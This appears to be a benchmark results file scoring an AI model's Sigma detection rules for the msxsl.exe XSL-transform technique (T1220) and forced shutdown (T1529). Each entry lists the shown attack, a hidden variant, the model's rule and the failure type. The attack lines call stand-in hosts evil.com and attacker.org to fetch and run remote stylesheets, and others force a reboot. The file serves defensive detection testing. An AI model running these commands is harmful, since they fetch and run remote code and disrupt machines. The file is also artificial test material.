# Non-PASS first-try rules

qwen2.5-coder:14b T1220 repeat 2: MISSED_SHOWN
Error: missed the shown attack
Shown line: C:\Windows\msxsl.exe C:\temp\data.xml http://evil.com/sheet.xsl
Variant: C:\Windows\msxsl.exe C:\temp\data.xml http://attacker.org/transform.xsl
Detection:
selection:
  Image|endswith: \msxsl.exe
  CommandLine|contains|windash|all:
  - http://
  - https://
condition: selection

qwen2.5-coder:14b T1220 repeat 3: MISSED_SHOWN
Error: missed the shown attack
Shown line: C:\Windows\msxsl.exe C:\temp\data.xml http://evil.com/sheet.xsl
Variant: C:\Windows\msxsl.exe C:\temp\data.xml http://attacker.org/transform.xsl
Detection:
selection:
  Image|endswith: \msxsl.exe
  CommandLine|contains|windash|all:
  - http://
  - https://
condition: selection

qwen2.5-coder:14b T1529 repeat 1: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\shutdown.exe /r /t 0
Variant: C:\Windows\System32\shutdown.exe /r /t 30
Detection:
selection:
  Image|endswith: \shutdown.exe
  CommandLine|contains|windash|all:
  - /r
  - /t 0
condition: selection

qwen2.5-coder:14b T1529 repeat 2: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\shutdown.exe /r /t 0
Variant: C:\Windows\System32\shutdown.exe /r /t 30
Detection:
selection:
  Image|endswith: \shutdown.exe
  CommandLine|contains|windash|all:
  - /r
  - /t 0
condition: selection

qwen2.5-coder:14b T1529 repeat 3: TOO_NARROW
Error: too narrow: caught the shown attack but missed the hidden variant
Shown line: C:\Windows\System32\shutdown.exe /r /t 0
Variant: C:\Windows\System32\shutdown.exe /r /t 30
Detection:
selection:
  Image|endswith: \shutdown.exe
  CommandLine|contains|windash|all:
  - /r
  - /t 0
condition: selection

